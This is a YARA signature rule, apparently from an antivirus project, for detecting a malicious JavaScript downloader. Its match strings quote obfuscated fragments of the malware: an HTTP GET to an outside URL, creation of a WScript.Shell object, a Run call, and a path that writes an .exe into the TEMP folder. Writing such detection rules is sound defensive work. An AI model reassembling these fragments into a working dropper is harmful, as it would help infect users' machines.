rule sig_20160401_b9a6b23f3a11e2aa8876ec722749d00e {
  meta:
    description = "datamaliciousorder - file 20160401_b9a6b23f3a11e2aa8876ec722749d00e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c58252d5411e5ecb6bdcbcac1969a28734b5ea3fcdbd4cd965ac9fbfb7e69440"

  strings:
    $s1  = "PkaJf[KnZix](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "function TkQz(TiKg, LlfJo){GjOr = GjOr * 1; return TiKg - LlfJo;};" fullword ascii
    $s3  = "var UbcWce = function KrXvu() {return WScript[TlwQa](\"WScript\"+\".Shell\");}(), EfvRsi = 11;" fullword ascii
    $s4  = "if (PkaJf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ChrOhk(){return EscRj + \"\";};" fullword ascii
    $s6  = "function OjRod() {return ((SfqArr == true) && (SfqArr == VoyWw)) ? 1 : GjOr;};" fullword ascii
    $s7  = "function ApzXs(){return 23;};" fullword ascii
    $s8  = "function YfYh()" fullword ascii
    $s9  = "SfqArr = true; " fullword ascii
    $s10 = "var VoyWw = false;" fullword ascii
    $s11 = "function RnbLtn(){return TlwQa;};" fullword ascii
    $s12 = "VoyWw = true; " fullword ascii
    $s13 = "var SfqArr = false;" fullword ascii
    $s14 = "function PjeYah(AvcFzl){UbcWce[\"R\"+\"un\"](AvcFzl, GjOr, GjOr);};" fullword ascii
    $s15 = "var IsoRwu = false;" fullword ascii
    $s16 = "return TkQz(QdSbt, TxrGks);" fullword ascii
    $s17 = "var MzPsv = new this[\"Date\"]();" fullword ascii
    $s18 = "function NxVhs(HeYyl) {var JtLmk = (1, 2, 3, 4, 5, HeYyl); return JtLmk;};" fullword ascii
    $s19 = "function UsuOzm() {return UbcWce[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zSqs5ncaFzCmtGr.ex\" + \"e\";};" fullword ascii
    $s20 = "}while (ZnKly);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}